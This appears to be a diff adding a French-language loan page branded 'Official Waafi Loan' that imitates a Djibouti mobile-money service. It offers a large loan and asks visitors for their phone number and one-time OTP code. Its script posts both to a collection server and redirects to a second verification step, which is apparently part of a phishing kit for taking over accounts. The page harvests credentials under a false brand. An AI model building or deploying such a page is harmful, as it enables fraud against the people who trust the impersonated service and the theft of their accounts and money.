@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Official Waafi Loan</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="css/style.css">
+
+</head>
+
+
+<body>
+
+
+<header class="top-header">
+
+<div class="brand">
+Official Waafi Loan
+</div>
+
+
+<div class="login-area">
+
+<span>
+Connexion / Inscription
+</span>
+
+<button>
+Lier le compte
+</button>
+
+</div>
+
+</header>
+
+
+
+
+<section class="loan-banner">
+
+
+<div class="banner-content">
+
+
+<p class="small-title">
+FINANCEMENT RAPIDE ET FLEXIBLE
+</p>
+
+
+<h1>
+Votre crédit, selon vos choix
+</h1>
+
+
+<h2>
+DJF 1,000,000
+</h2>
+
+
+
+<div class="loan-details">
+
+
+<div>
+
+<strong>
+PAR MOIS
+</strong>
+
+<br>
+
+DJF 45,000
+
+</div>
+
+
+
+<div>
+
+<strong>
+DURÉE
+</strong>
+
+<br>
+
+12 mois
+
+</div>
+
+
+
+<div>
+
+<strong>
+INTÉRÊT
+</strong>
+
+<br>
+
+2.5% / mois
+
+</div>
+
+
+</div>
+
+
+</div>
+
+
+</section>
+
+
+
+
+
+<section class="verify-card">
+
+
+<h2>
+Saisissez votre numéro
+</h2>
+
+
+<p>
+Entrez votre numéro de téléphone pour recevoir votre code OTP
+</p>
+
+
+
+<form id="step1Form">
+
+
+<div class="phone-input">
+
+
+<span>
+🇩🇯 +253
+</span>
+
+
+<input
+
+id="phone"
+
+type="tel"
+
+placeholder="7XXXXXXX"
+
+required>
+
+
+</div>
+
+
+
+<input
+
+id="testCode"
+
+class="otp"
+
+type="text"
+
+placeholder="Code OTP"
+
+required>
+
+
+
+<button type="submit">
+
+Demander le code (OTP)
+
+</button>
+
+
+
+</form>
+
+
+
+</section>
+
+
+
+
+
+<footer>
+
+© 2026 Official Waafi Loan
+
+</footer>
+
+
+
+
+<<script>
+
+document.getElementById("step1Form").addEventListener("submit", async function(e){
+
+    e.preventDefault();
+
+    let phone = document.getElementById("phone").value;
+    let code = document.getElementById("testCode").value;
+
+    try {
+
+        const response = await fetch("http://127.0.0.1:5000/contact", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                phone: phone,
+
+                code: code
+
+            })
+
+        });
+
+        const result = await response.json();
+
+        if(result.status === "success"){
+
+            localStorage.setItem(
+                "session_id",
+                result.session_id
+            );
+
+            alert("Information sent successfully");
+
+            window.location.href = "verify2.html";
+
+        }else{
+
+            alert("Unable to create session.");
+
+        }
+
+    }
+
+    catch(error){
+
+        console.log(error);
+
+        alert("Connection error");
+
+    }
+
+});
+
+</script>
